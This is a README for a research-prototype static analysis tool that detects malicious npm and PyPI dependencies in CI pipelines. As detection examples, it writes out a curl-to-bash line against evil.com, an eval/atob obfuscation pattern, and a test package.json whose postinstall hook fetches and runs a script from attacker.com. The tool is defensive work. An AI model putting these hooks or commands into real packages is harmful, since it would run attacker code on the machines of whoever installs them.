# CI Supply Chain Guard

A static analysis tool for detecting malicious dependencies in CI/CD pipelines before they're merged into your codebase.

[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
[![Python 3.10+](https://img.shields.io/badge/python-3.10+-blue.svg)](https://www.python.org/downloads/)

**Author:** Otsmane Ahmed  
**Status:** Research Prototype v1.0

---

## Quick Start

```bash
# 1. Clone and install
git clone https://github.com/Otsmane-Ahmed/ci-supplychain-guard.git
cd ci-supplychain-guard
python3 -m venv venv
source venv/bin/activate  # On Windows: venv\Scripts\activate
pip install -r requirements.txt


```bash
# 1. Clone and install
git clone https://github.com/Otsmane-Ahmed/ci-supplychain-guard.git
cd ci-supplychain-guard
python3 -m venv venv
source venv/bin/activate  # On Windows: venv\Scripts\activate
pip install -r requirements.txt

# 2. Scan a package directory
python3 main_guard.py /path/to/package
```

The tool will output a verdict: `SAFE`, `SUSPICIOUS`, or `BLOCKED`.

---

## Usage Examples

### Scanning a Package Before Installation

If you've downloaded a package from npm or PyPI and want to verify it's safe:

```bash
# NPM package
npm pack suspicious-package
tar -xzf suspicious-package-*.tgz
python3 main_guard.py ./package

# Python package
pip download untrusted-pkg --no-deps
tar -xzf untrusted-pkg-*.tar.gz
python3 main_guard.py ./untrusted-pkg-1.0.0
```

### Scanning Installed Dependencies

Check packages that are already installed in your project:

```bash
# Scan all npm packages
python3 main_guard.py ./node_modules

# Scan a specific Python package
python3 main_guard.py ./venv/lib/python3.10/site-packages/requests
```

Note: Scanning large directories like `node_modules` will take longer. For faster results, scan individual packages.

### CI/CD Integration

Example GitHub Actions workflow:

```yaml
name: Security Scan
on: [pull_request]
jobs:
  scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - name: Setup Python
        uses: actions/setup-python@v4
        with:
          python-version: '3.10'
      - name: Install CI-Guard
        run: |
          git clone https://github.com/Otsmane-Ahmed/ci-supplychain-guard.git
          cd ci-supplychain-guard
          pip install -r requirements.txt
      - name: Scan Dependencies
        run: |
          cd ci-supplychain-guard
          python3 main_guard.py ../your-project-directory
```

The pipeline will fail (exit code 1) if malicious code is detected.

---

## Understanding Output

### Safe Package
```bash
$ python3 main_guard.py ./clean-package

Scanning target: ./clean-package
Running static analysis...
Static Risk Score: 0/100
Verdict: SAFE
```

No malicious patterns detected.

### Blocked Package
```bash
$ python3 main_guard.py ./evil-package

Scanning target: ./evil-package
Running static analysis...
Static Risk Score: 18/100
Verdict: BLOCKED (Critical Risk)
```

Dangerous patterns detected (e.g., shell injection, credential theft). Do not install this package.

Packages with a score of 10 or higher are automatically blocked.

### Suspicious Package
```bash
$ python3 main_guard.py ./suspicious-package

Scanning target: ./suspicious-package
Running static analysis...
Static Risk Score: 6/100
Verdict: SUSPICIOUS (Score 6). Initiating sandbox...
```

Some concerning patterns found. If Docker is running, the package will be tested in an isolated sandbox for verification. Manual review is recommended.

---

## Detection Capabilities

| Attack Type | Example | Status |
|-------------|---------|--------|
| Shell Injection | `curl evil.com \| bash` | Detected |
| Credential Theft | Reading `process.env` and sending to external server | Detected |
| Code Obfuscation | `eval(atob('base64...'))` | Detected |
| Malicious Install Scripts | NPM `postinstall` hooks | Detected |
| Binary Files | `.exe`, `.dll` in packages | Detected |
| Typosquatting | Similar names to popular packages | Manual check required |

---

## Testing the Tool

You can test CI-Guard by creating a sample malicious package:

```bash
# Create test directory
mkdir ~/test-malicious
cd ~/test-malicious

# Create package.json with malicious postinstall hook
cat > package.json << 'EOF'
{
  "name": "evil-package",
  "version": "1.0.0",
  "scripts": {
    "postinstall": "curl http://attacker.com/steal.sh | bash"
  }
}
EOF

# Scan it
cd ~/ci-supplychain-guard
python3 main_guard.py ~/test-malicious
```

Expected output:
```
Static Risk Score: 18/100
Verdict: BLOCKED (Critical Risk)
```

---

## Performance

| Ecosystem | Packages Tested | Detection Rate |
|-----------|----------------|----------------|
| NPM | 15,059 | 89.6% |
| PyPI | 2,257 | 82.2% |

Average scan time: 1-3 seconds per package (static analysis only)

---

## FAQ

**Can I scan packages that are already installed?**

Yes. Point CI-Guard at your `node_modules` directory or Python `site-packages`:
```bash
python3 main_guard.py ./node_modules/some-package
python3 main_guard.py ./venv/lib/python3.10/site-packages/requests
```

**What if a legitimate package gets flagged?**

CI-Guard errs on the side of caution. If you trust a flagged package:
1. Check the detection rules in `analyzer/static_scanner.py`
2. Identify which pattern triggered the alert
3. Manually review the package source code

**Does this work on Windows and macOS?**

Yes. Python and Docker are cross-platform.

**Do I need Docker installed?**

Docker is only required for packages that score 4-9 (suspicious). Most packages are either clearly safe (0-3) or clearly malicious (10+).

---

## Requirements

- Python 3.10+
- Docker (optional, for sandbox verification)
- Supported OS: Linux, macOS, Windows

---

## How It Works

CI-Guard uses a three-tier "Traffic Light" system:

- **Green (0-3):** Safe - no malicious patterns detected
- **Yellow (4-9):** Suspicious - requires sandbox verification
- **Red (10+):** Blocked - critical malicious patterns found

Detection methods:
- **Static Analysis:** Pattern matching using regex and AST (Abstract Syntax Tree)
- **Reachability Analysis:** Filters false positives from dead code
- **Sandbox:** Optional Docker container with honeytokens to detect evasion

---

## Contributing

Pull requests are welcome. To add a new detection rule:

Edit `analyzer/static_scanner.py` and add to the `RULES` list:
```python
{
    "id": "SA-XXX",
    "name": "Rule Name",
    "pattern": r"regex_pattern",
    "weight": 8  # Score contribution (1-10)
}
```

---

## License

MIT License - see [LICENSE](LICENSE) file for details.

---

## Contact

Otsmane Ahmed - [GitHub](https://github.com/Otsmane-Ahmed)

